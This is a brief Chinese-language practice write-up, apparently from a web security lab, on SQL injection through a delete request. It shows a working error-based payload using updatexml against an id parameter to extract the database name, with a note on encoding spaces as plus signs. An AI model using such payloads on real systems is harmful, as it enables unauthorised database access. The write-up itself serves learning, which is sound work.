# delete注入

　　根据题目不难猜出 和删除有关系

　　先输入 再进行删除 并抓包

![image](assets/image-20251115153151-ngerxfg.png)

　　可以看到这里有?id参数

　　这里对?id=进行报错注入

　　payload：

　　?id=58 or updatexml(1,concat(0x7e,(select+database()),0x7e),1)

　　发现不行 原来是这关 被编译了 自己将 换为+或是

![屏幕截图 2025-11-15 155016](assets/屏幕截图%202025-11-15%20155016-20251115155153-mbav1wf.png)

　　?id=58+or+updatexml(1,concat(0x7e,(select+database()),0x7e),1)

![image](assets/image-20251115155138-3hrnq54.png)

　　将database换为要查找的内容
